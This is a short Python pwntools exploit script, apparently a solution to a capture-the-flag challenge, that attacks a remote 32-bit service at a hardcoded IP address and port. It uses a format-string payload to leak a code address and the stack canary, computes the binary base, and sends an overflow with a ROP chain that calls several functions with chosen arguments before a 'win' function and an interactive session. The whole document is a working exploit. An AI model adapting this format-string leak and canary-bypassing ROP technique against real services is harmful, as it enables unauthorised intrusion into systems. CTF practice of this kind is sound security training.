from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

p = remote('14.225.212.104', 9004)
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')

code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
ornn = base + 0x12ea
thress = base + 0x1307
win = base + 0x1324
pop_ret = base + 0x1022

log.info(f"Base: 0x{base:08x}, Canary: 0x{canary:08x}")

# ROP chain
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(braum)
payload += p32(pop_ret)
payload += p32(0x1337)
payload += p32(ornn)
payload += p32(pop_ret)
payload += p32(0x420)
payload += p32(thress)
payload += p32(pop_ret)
payload += p32(0xdeadbeef)
payload += p32(win)
payload += p32(0)
payload += p32(0x123)

p.sendline(payload)
p.interactive()
